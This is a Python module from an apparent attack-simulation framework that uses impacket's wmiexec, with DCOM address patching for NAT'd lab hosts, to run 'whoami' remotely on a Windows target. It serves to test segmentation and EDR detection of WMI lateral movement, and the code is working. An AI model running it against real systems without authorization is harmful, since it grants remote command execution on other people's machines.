"""WMI lateral movement via impacket, called in-process (not the
impacket-wmiexec CLI) so modules/_portpatch.py + modules/_dcompatch.py can
transparently redirect the connection when the target is a NAT'd lab host
(see test2.py / modules/_portpatch.py for the SMB(445)/RPC(135) leg, and
modules/_dcompatch.py for why WMI additionally needs its own fix: DCOM's
OXID resolver hands back the *server's own internal address* for every
COM object it creates — 192.168.122.x here, not the droplet's public IP —
and impacket only accepts a string binding whose address matches the
target we connected with. _dcompatch rewrites that address to target_ip,
keeping the (already-forwarded, same dynamic range DCSync uses) port.

For any other target this is equivalent to:
    impacket-wmiexec {domain}/{dc_user}:{dc_pass}@{target} "whoami"

Tests segmentation (SMB/RPC/DCOM) + IPS/EDR WMI-execution detection —
same class of finding as psexec.py, different transport (DCOM/WMI's
Win32_Process.Create, not SVCManager), so a defender that only signatures
one and not the other shows up as a gap here.

wmiexec.py ships only as a Kali doc "example" script, not inside the
importable impacket.examples package, so it's loaded from disk by path.
"""
import io
import sys
import contextlib
import importlib.util

from modules import _portpatch
from modules import _dcompatch

META = {
    "id": "wmiexec",
    "name": "WMI Lateral Movement",
    "category": "AD Exploitation",
    "test_type": "attack_sim",  # same segmentation/lateral-movement family as psexec, different transport (DCOM vs SVCManager)
    "family": "D",
    "control": "Segmentation (SMB/RPC/DCOM) + IPS/EDR WMI-exec detection",
    "fix": "SD-WAN",
    "mitre": ['T1047'],
    "cwe": [],
    "tactic": 'Lateral Movement',
    "requires": [],  # runs entirely in-process, not a shutil.which-checkable CLI tool
    "ports": [("tcp", 445), ("tcp", 135)],
    "success_regex": r"nt authority\\system|\\administrator\s*$",
    "blocked_regex": (
        r"STATUS_ACCESS_DENIED|rpc_s_access_denied|timed out|refused|unreachable|Errno|"
        r"Can't find a valid stringBinding"
    ),
}

_WMIEXEC_SCRIPT = "/usr/share/doc/python3-impacket/examples/wmiexec.py"


def _load_wmiexec_class():
    spec = importlib.util.spec_from_file_location("_impacket_wmiexec_script", _WMIEXEC_SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    # Register before exec so impacket's NDR (de)marshalling can resolve
    # classes via sys.modules[cls.__module__] — see the same fix in
    # modules/psexec.py / modules/petitpotam.py.
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod.WMIEXEC


def run(target, ctx):
    is_custom = _portpatch.is_custom_port_target(target)
    header = f"# WMIExec (in-process impacket) vs {target}"
    header += " [custom-port + DCOM patch active]\n\n" if is_custom else "\n\n"

    if is_custom:
        _portpatch.install(target)
        _dcompatch.install(target)

    buf = io.StringIO()
    try:
        WMIEXEC = _load_wmiexec_class()
        executer = WMIEXEC(
            "whoami", ctx.creds["dc_user"], ctx.creds["dc_pass"], ctx.creds["domain"],
            share="ADMIN$", remoteHost=target,
        )
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
            try:
                executer.run(target)
            except SystemExit as e:
                buf.write(f"\n[exit code {e.code}]\n")
        return header + buf.getvalue()
    except Exception as e:
        import traceback
        return header + buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
    finally:
        if is_custom:
            _dcompatch.remove()
            _portpatch.remove()
